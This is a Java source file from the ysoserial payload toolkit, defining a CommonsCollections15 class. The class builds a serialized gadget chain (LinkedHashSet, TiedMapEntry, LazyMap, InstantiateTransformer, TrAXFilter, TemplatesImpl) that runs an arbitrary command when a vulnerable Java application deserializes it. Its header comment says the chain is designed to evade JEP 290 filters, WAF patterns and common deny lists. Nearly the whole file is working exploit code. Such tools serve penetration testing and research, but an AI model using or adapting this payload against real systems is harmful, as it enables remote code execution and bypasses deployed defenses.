package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

import javax.xml.transform.Templates;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Double evasion: LinkedHashSet root + InstantiateTransformer sink.
	Combines CC12's root bypass with CC14's sink bypass.

	Discovered by combining K1 (@zema1) with LinkedHashSet trigger (@su18).

	Gadget chain:
		ObjectInputStream.readObject()
			LinkedHashSet.readObject()         [inherits HashSet.readObject()]
				HashMap.put()
					HashMap.hash()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer(TrAXFilter.class)
										InstantiateTransformer([Templates], [TemplatesImpl])
											TrAXFilter.<init>(TemplatesImpl)
												TemplatesImpl.newTransformer()
													defineClass() -> RCE

	Double evasion:
		1. LinkedHashSet root: bypasses HashSet/HashMap class-level filters
		2. InstantiateTransformer sink: bypasses InvokerTransformer class-level filters

	Neither class appears in standard deny lists:
		- JEP 290 doesn't block LinkedHashSet or InstantiateTransformer
		- WAF patterns targeting "HashSet" don't match "LinkedHashSet" (class-level)
		- InvokerTransformer is commonly filtered; InstantiateTransformer is not

	Requires:
		commons-collections 3.x
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.ZEMA1, Authors.SU18 })
public class CommonsCollections15 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(command);

		// inert chain for setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// real chain: InstantiateTransformer(TrAXFilter) -> TemplatesImpl
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(TrAXFilter.class),
			new InstantiateTransformer(
				new Class[] { Templates.class },
				new Object[] { templatesImpl })};

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// LinkedHashSet root trigger
		LinkedHashSet map = new LinkedHashSet(1);
		map.add("foo");

		Field f = null;
		try {
			f = java.util.HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = java.util.HashSet.class.getDeclaredField("backingMap");
		}
		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}
		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) node = array[1];

		Field keyField = Reflections.getField(node.getClass(), "key");
		keyField.set(node, entry);

		// arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections15.class, args);
	}
}
